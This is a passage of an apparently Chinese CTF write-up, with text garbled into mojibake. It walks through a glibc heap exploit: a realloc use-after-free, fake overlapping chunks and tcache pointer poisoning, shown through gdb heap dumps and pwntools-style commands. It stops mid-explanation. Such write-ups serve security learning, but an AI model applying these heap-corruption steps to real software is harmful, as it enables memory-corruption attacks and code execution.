</span><br><span class="line">0024| 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf48 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdf50 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdf58 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf60 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x00007ffff7eebf81 <span class="keyword">in</span> __GI___libc_read (fd=0x0, buf=0x7fffffffdf40, nbytes=0xc7) at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line">26      ../sysdeps/unix/sysv/linux/read.c: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•.</span><br><span class="line">Breakpoint 1 at 0x555555555c2b</span><br></pre></td></tr></table></figure>

<p>å½“æ·»åŠ ä¸€ä¸ªæ–‡ä»¶:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) add(<span class="string">&#x27;test&#x27;</span>, 0x60, <span class="string">&#x27;this is a test&#x27;</span>) </span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>

<p>gdbæ›´æ–°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[0x000055555555b260] <span class="built_in">test</span>    : this is a <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c370: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c380: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c390: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c430: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c460: 0x0000000000000000      0x0000000000000000</span><br><span class="line">-----------------------------------</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0                                                                                                                 </span><br><span class="line">(0x40)     fastbin[2]: 0x0                                                                                                                 </span><br><span class="line">(0x50)     fastbin[3]: 0x0                                                                                                                 </span><br><span class="line">(0x60)     fastbin[4]: 0x0                                                                                                                 </span><br><span class="line">(0x70)     fastbin[5]: 0x0                                                                                                                 </span><br><span class="line">(0x80)     fastbin[6]: 0x0                                                                                                                 </span><br><span class="line">(0x90)     fastbin[7]: 0x0                                                                                                                 </span><br><span class="line">(0xa0)     fastbin[8]: 0x0                                                                                                                 </span><br><span class="line">(0xb0)     fastbin[9]: 0x0                                                                                                                 </span><br><span class="line">                  top: 0x55555555b2c0 (size : 0x20d40)                                                                                     </span><br><span class="line">       last_remainder: 0x0 (size : 0x0)                                                                                                    </span><br><span class="line">            unsortbin: 0x0</span><br></pre></td></tr></table></figure>

<h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><p>å¼€å‘è¿™ç§æ¼æ´åˆ©ç”¨ç¨‹åºå¤ªç–¯ç‹‚äº†ã€‚æ¯æ¬¡è¿›å…¥ä¸‹ä¸€ä¸ªæ­¥éª¤æ—¶ï¼Œéƒ½å¿…é¡»è¿”å›å¹¶å®Œå…¨é‡æ–°æ„å»ºå‰ä¸€ä¸ªï¼Œç§»åŠ¨æ–¹å—ï¼Œå°è¯•ä¸åŒå¤§å°çš„binsã€‚ä¸å¯èƒ½åœ¨æœ¬æ–‡ä¸­å±•ç¤ºæ‰€æœ‰è¿™äº›æ­¥éª¤ï¼Œä½†æ˜¯ï¼Œå°†å°è¯•åœ¨å®Œæˆçš„è„šæœ¬ä¸­å®Œæˆä¸åŒçš„ç›®æ ‡ï¼Œå¹¶å±•ç¤ºå¦‚ä½•ä½¿ç”¨è„šæœ¬æ“ä½œå †æ¥å®Œæˆæ‰€éœ€è¦çš„ä»»åŠ¡ã€‚ä½†æ˜¯å€¼å¾—è¡¥å……çš„æ˜¯ï¼Œå½“ç¬¬ä¸€æ¬¡åœ¨å †ä¸Šè·å¾—libcåœ°å€æ—¶ï¼Œä»£ç çœ‹èµ·æ¥å®Œå…¨ä¸åŒã€‚å½“è¿›å…¥ä¸‹ä¸€ä¸ªæ­¥éª¤æ—¶ï¼Œå°†ä½¿ç”¨ç›¸åŒçš„é€šç”¨æŠ€æœ¯ï¼Œä½†éœ€è¦å®Œå…¨é‡æ–°è®¾è®¡ä¸åŒbinsçš„é—´è·å’Œå¤§å°ï¼Œä»¥å®Œæˆå·²ç»å®ç°çš„ç›®æ ‡å’Œä¸‹ä¸€ä¸ªç›®æ ‡ã€‚</p>
<h2 id="å¼±ç‚¹"><a href="#å¼±ç‚¹" class="headerlink" title="å¼±ç‚¹"></a>å¼±ç‚¹</h2><ul>
<li>æè¿°</li>
</ul>
<p>è¿™é‡Œçš„æ¼æ´åœ¨äºç¼–è¾‘å‘½ä»¤ä¸­çš„reallocï¼Œä»¥åŠå®ƒå¦‚ä½•æ ¹æ®å½“å‰å¤§å°å’Œæ–°å¤§å°åšå‡ºååº”:</p>
<table>
<thead>
<tr>
<th align="left">å¤§å°æ¯”è¾ƒ</th>
<th align="left">é‡‡å–åŠ¨ä½œ</th>
</tr>
</thead>
<tbody><tr>
<td align="left">new_size &#x3D;&#x3D; 0</td>
<td align="left">free(buffer), return null</td>
</tr>
<tr>
<td align="left">new_size &gt; 0 &amp;&amp; new_size &lt; orig_size</td>
<td align="left">åˆ†æˆä¸¤ä¸ªå—ï¼Œè¿”å›ç›¸åŒçš„åœ°å€å’Œæ›´å°çš„å—ï¼Œå¹¶åœ¨æ—§å—çš„æœ«å°¾ç•™ä¸‹ç©ºé—²å—</td>
</tr>
<tr>
<td align="left">new_size &gt; 0 &amp;&amp; new_size &gt; orig_size</td>
<td align="left">é‡Šæ”¾æ—§å—ï¼Œä¸ºæ›´å¤§çš„å—åˆ†é…æ–°å—ï¼Œå¹¶è¿”å›è¯¥åœ°å€ã€‚</td>
</tr>
</tbody></table>
<p>ä¸Šé¢çš„ä»£ç æ£€æŸ¥è¿”å›å€¼æ˜¯å¦ä¸ºnullï¼Œä½†éšååªæ‰“å°ä¸€æ¡æ¶ˆæ¯ï¼Œè€Œä¸æ›´æ”¹å­˜å‚¨çš„æŒ‡é’ˆã€‚è¿™ä¼šç»™ç”¨æˆ·ç•™ä¸‹ä¸€ä¸ªæŒ‡å‘å·²é‡Šæ”¾å†…å­˜çš„æŒ‡é’ˆï¼Œè¿™æ˜¯å¾ˆç³Ÿç³•çš„ã€‚</p>
<ul>
<li>ä¾‹å­</li>
</ul>
<p>ä¸ºäº†çœ‹åˆ°è¿™ä¸€ç‚¹ï¼Œå°†è¿è¡Œä»¥ä¸‹ä»£ç :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) add(<span class="string">&#x27;1&#x27;</span>, 0x50)</span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb) add(<span class="string">&#x27;2&#x27;</span>, 0x50)</span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb) <span class="built_in">rm</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">(Pdb) edit(<span class="string">&#x27;2&#x27;</span>, 0)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å‰©ä¸‹äº†ä»¥ä¸‹å†…å®¹(&lt;â€“ ç”±æˆ‘æ·»åŠ ):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">[0x000055555555c2c0] 2       : `UUUU                        &lt;-- still have pointer to chunk2</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000061  &lt;-- freed chunk 1</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010  &lt;-- tcache pointer null, key</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x0000000000000061  &lt;-- freed chunk 2</span><br><span class="line">0x55555555c2c0: 0x000055555555c260      0x000055555555c010  &lt;-- tcache pointer to freed 1, key</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000020cf1  &lt;-- end of heap</span><br><span class="line">...[snip]...</span><br><span class="line">-----------------------------------</span><br><span class="line">...[snip]...</span><br><span class="line">                  top: 0x55555555c310 (size : 0x20cf0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x60)   tcache_entry[4](2): 0x55555555c2c0 --&gt; 0x55555555c260  &lt;-- both chunks <span class="keyword">in</span> tcache list</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å¯åˆ©ç”¨çš„ï¼Œå› ä¸ºè¿˜æœ‰ä¸€ä¸ªæŒ‡å‘edit2çš„æŒ‡é’ˆï¼Œå°½ç®¡å®ƒå·²ç»è¢«é‡Šæ”¾äº†ã€‚è¿™æ„å‘³ç€å¯ä»¥é€šè¿‡ç¼–è¾‘2æ¥æ›´æ”¹tcacheé“¾è¡¨ã€‚</p>
<h2 id="åœ¨å †ä¸Šå¾—åˆ°libc"><a href="#åœ¨å †ä¸Šå¾—åˆ°libc" class="headerlink" title="åœ¨å †ä¸Šå¾—åˆ°libc"></a>åœ¨å †ä¸Šå¾—åˆ°libc</h2><ul>
<li>ç­–ç•¥</li>
</ul>
<p>ä»è¿™ä¸ªå°æ¼æ´åˆ°ä»£ç æ‰§è¡Œçš„è·¯å¾„å¹¶ä¸æ˜æ˜¾ã€‚å› ä¸ºASLRï¼Œéœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯ä»libcæ³„éœ²ä¸€äº›ä¿¡æ¯ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆéœ€è¦ä»libcè·å¾—ä¸€äº›ä¸œè¥¿åˆ°å †ä¸Šã€‚å½“é‡Šæ”¾è¿™äº›binsæ—¶ï¼Œå®ƒä»¬å°†è¿›å…¥tcacheï¼Œè¿™æ˜¯ä¸€å †ä»libcå¼€å§‹çš„å•é“¾è¡¨ï¼Œç„¶ååˆ—è¡¨å®¹å™¨ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯æŒ‡å‘ä¸‹ä¸€é¡¹çš„æŒ‡é’ˆã€‚ä½†å…¶ä»–ç±»å‹æ˜¯åŒé“¾è¡¨ã€‚è¿™æ„å‘³ç€æ¯ä¸ªèŠ‚ç‚¹æ—¢æŒ‡å‘å®ƒåé¢çš„èŠ‚ç‚¹ï¼Œä¹ŸæŒ‡å‘å®ƒå‰é¢çš„èŠ‚ç‚¹ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªèŠ‚ç‚¹åœ¨libcä¸­å…·æœ‰èµ·å§‹èŠ‚ç‚¹çš„åœ°å€ã€‚å¯ä»¥é€šè¿‡ç”¨7ä¸ªç»™å®šå¤§å°çš„binså¡«å……tcacheï¼Œç„¶åå†é‡Šæ”¾ä¸€ä¸ªbinï¼Œå°†ä¸€äº›ä¸œè¥¿æ”¾å…¥æœªæ’åºçš„binsä¸­ã€‚</p>
<p>è¿™å°†éœ€è¦å¤§é‡çš„è·³è·ƒï¼Œå½“è¢«é™åˆ¶åœ¨åªæœ‰ä¸¤ä¸ªâ€œæ–‡ä»¶â€çš„ç¨‹åºåœ¨åŒä¸€æ—¶é—´ã€‚</p>
<ul>
<li>é—´è·</li>
</ul>
<p>ASLRå’ŒFull RELROå°†æ”¹å˜æ¯ä¸ªå•è¯é™¤äº†ä½12ä½ä»¥å¤–çš„æ‰€æœ‰å†…å®¹ã€‚å¯ä»¥ä¸€éåˆä¸€éåœ°è¿è¡Œç¨‹åºï¼Œåªè¦ä»¥ç›¸åŒçš„é¡ºåºå®šä¹‰ç›¸åŒçš„å—ï¼Œæ¯ä¸ªåœ°å€çš„ä½12ä½å°†æ˜¯ç›¸åŒçš„ã€‚è¿™æ„å‘³ç€å¯ä»¥æ‰¾åˆ°ä¸€äº›åœ°æ–¹ï¼Œåœ¨é‚£é‡Œå¯ä»¥åªè¦†ç›–åœ°å€ä¸­çš„ä½å­—èŠ‚ï¼Œä»è€Œåœ¨ä¸çŸ¥é“é«˜å­—èŠ‚çš„æƒ…å†µä¸‹æ›´æ”¹å®ƒã€‚è¿™ä¹Ÿæ„å‘³ç€æœ‰äº›æ—¶å€™æƒ³ä»æŸä¸ªç‰¹å®šçš„ç©ºé—´å¼€å§‹ã€‚å¦‚æœåœ¨0x2e0å¤„åˆ›å»ºäº†ä¸€ä¸ªå‡å—ï¼Œå¹¶ä¸”ä¸èƒ½è¦†ç›–å½“å‰æŒ‡å‘0x320çš„æŒ‡é’ˆã€‚ä½†æ˜¯å¦‚æœåœ¨å¼€å§‹æ—¶åªå‘å †ä¸­æ·»åŠ ä¸€å°å—ï¼Œå¹¶å°†å®ƒä»¬ç§»åˆ°0x310å’Œ0x350ï¼Œç°åœ¨å¯ä»¥ç”¨0x10è¦†ç›–è¾ƒä½çš„0x50ã€‚</p>
<ul>
<li>å‡å—</li>
</ul>
<p>åˆ›å»ºä¸€ä¸ªå‡çš„é‡å å—ï¼Œå®ƒå¯ä»¥å†™å…¥ä¸‹ä¸€ä¸ªå—çš„å…ƒæ•°æ®ã€‚å¯ä»¥åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­é€‰æ‹©ï¼Œä½†ä¸æ˜¯ç¬¬ä¸€ä¸ªå—å†™å…¥ä»»ä½•æ„Ÿå…´è¶£çš„å†…å®¹ï¼Œè€Œæ˜¯è®©å®ƒå†™å…¥ä¸€äº›çœ‹èµ·æ¥åƒå †å…ƒæ•°æ®çš„å†…å®¹ï¼Œä¾‹å¦‚ï¼Œ0x61:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;A&#x27;</span>, 0x40, p64(0)*5 + p64(0x61) + p64(0))   <span class="comment"># A at 260 in f1</span></span><br><span class="line">add(<span class="string">&#x27;B&#x27;</span>, 0x40)                                  <span class="comment"># B at 2b0 in f2</span></span><br></pre></td></tr></table></figure>

<p>å½“è¿è¡Œè¿™ä¸ªæ—¶ï¼Œå †çœ‹èµ·æ¥åƒ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051  &lt;-- A meta</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- data, but looks like heap meta</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- B meta</span><br><span class="line">0x55555555c2b0: 0x0000000000000a78      0x0000000000000000  &lt;-- B data</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11  &lt;-- end of heap</span><br></pre></td></tr></table></figure>

<p>é‡Šæ”¾Aï¼Œç„¶åé‡Šæ”¾Bï¼ŒæŠŠå®ƒç¼–è¾‘ä¸º0ã€‚ç„¶ååœ¨æ·»åŠ å¦ä¸€ä¸ª0x40 binæ—¶ï¼Œå°†ä½¿ä¸¤ä¸ªæ–‡ä»¶æŒ‡å‘åŒä¸€ä¸ªä½ç½®ã€‚ä»è¿™é‡Œå¼€å§‹ï¼Œç§»é™¤ç¬¬ä¸€ä¸ªBå°†ä¼šè¿›å…¥æƒ³è¦æ”»å‡»çš„åœ°æ–¹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;A&#x27;</span>)                                         <span class="comment"># A in 0x50 tcache, f1 empty</span></span><br><span class="line">edit(<span class="string">&#x27;B&#x27;</span>, 0)                                    <span class="comment"># B -&gt; A in 0x50 tcache, f2 still B</span></span><br><span class="line">add(<span class="string">&#x27;B2&#x27;</span>, 0x40)                                 <span class="comment"># A in 0x50 tcache, f1 &amp; f2 -&gt; B</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>)                                         <span class="comment"># B -&gt; A in 0x50 tcache, f1 -&gt; B</span></span><br></pre></td></tr></table></figure>

<p>å †å¾ªç¯å¦‚ä¸‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051  &lt;-- A meta</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010  &lt;-- A pointer to next (null) and key</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- fake chunk</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- B meta</span><br><span class="line">0x55555555c2b0: 0x000055555555c260      0x000055555555c010  &lt;-- pointer to A and key</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>å½“ç°åœ¨ç”¨ä¸€ä¸ªå­—ç¬¦ç¼–è¾‘B2, 0x90ï¼Œå®ƒå°†è¦†ç›–tcacheæŒ‡é’ˆ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">&#x27;B2&#x27;</span>, 0x40, <span class="string">&#x27;\x90&#x27;</span>)                        <span class="comment"># B -&gt; fake1 in 0x50 tcache, f1 -&gt; B</span></span><br></pre></td></tr></table></figure>
<p>Heap:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x000055555555c290      0x000055555555c010  &lt;-- now points to fake chunk</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>heapinfoä¹Ÿæ˜¾ç¤ºäº†è¿™ä¸ª:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x50)   tcache_entry[3](2): 0x55555555c2b0 --&gt; 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) )</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦è®¿é—®è¿™ä¸ªå—ï¼Œé¦–å…ˆéœ€è¦å»æ‰2b0ã€‚ä¸èƒ½æŠŠå®ƒæ‹¿å‡ºæ¥é‡Šæ”¾ï¼Œå¦åˆ™å®ƒä¼šå›åˆ°åŸæ¥çš„åœ°æ–¹ã€‚æ‰€ä»¥ä¼šå¾—åˆ°å®ƒï¼ŒæŠŠå®ƒç¼–è¾‘æˆæ›´å°çš„å¤§å°ï¼Œç„¶åé‡Šæ”¾å®ƒï¼Œè®©ä¸¤ä¸ªæ›´å°çš„å—è¿›å…¥tcacheï¼Œç•™ä¸‹å‡å—å‡†å¤‡å¥½è¢«ä½¿ç”¨ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;B3&#x27;</span>, 0x40)                                 <span class="comment"># fake in 0x50 tcache, f2 -&gt; B</span></span><br><span class="line">edit(<span class="string">&#x27;B3&#x27;</span>, 0x20)                                <span class="comment"># B-end in 0x20 tcache</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B3&#x27;</span>)                                        <span class="comment"># B in 0x30 tcache</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œå°†æ·»åŠ ä¸€ä¸ª0x40æ¡ç›®ï¼Œå®ƒå°†è¿”å›290ï¼Œå¯ä»¥ä½¿ç”¨å®ƒè¦†ç›–åˆ°bä¸­ã€‚åœ¨è¿™æ ·åšä¹‹å‰ï¼Œæœ‰å¦ä¸€ä¸ªé—®é¢˜ã€‚æƒ³é‡Šæ”¾B2ï¼Œä½†ä¸èƒ½ï¼Œå› ä¸ºå®ƒä¼šè¿”å›ä¸€ä¸ªåŒè‡ªç”±é”™è¯¯ã€‚å®ƒæ­£åœ¨æ£€æŸ¥sizeå…ƒæ•°æ®åé¢0x10çš„é”®ï¼Œæ‰€ä»¥éœ€è¦æ›´æ”¹å®ƒã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ‰äº†æ–°çš„é‡å éƒ¨åˆ†ã€‚å› æ­¤ï¼Œå°†åˆ›å»ºå®ƒï¼Œä½¿å®ƒä¿æŒ0x51ä¸å˜ï¼Œä¸ºä¸‹ä¸€ä¸ªtcacheæ·»åŠ ä¸€ä¸ªnullï¼Œå¹¶æ›´æ”¹é”®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;fake1&#x27;</span>, 0x40, p64(0)*3 + p64(0x51) + p64(0))</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å †æ˜¾ç¤ºkeyä¸å†åŒ¹é…åå€¼:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x000055555555000a  &lt;-- no pointer and key ends <span class="keyword">in</span> <span class="string">&quot;\x00\x0a&quot;</span> and not <span class="string">&quot;\xc0\x10&quot;</span></span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>å°†é‡Šæ”¾B2å’Œfake1ï¼Œå®ƒä»¬éƒ½è¿›å…¥tcacheï¼Œéœ€è¦ä¸€ç§å‘ä»»æ„åœ°å€å†™å…¥çš„æ–¹æ³•æ—¶ï¼Œå¯ä»¥åœ¨æœ€åä½¿ç”¨å®ƒä»¬ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;fake1&#x27;</span>)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>tcacheç°åœ¨çœ‹èµ·æ¥åƒ:</p>
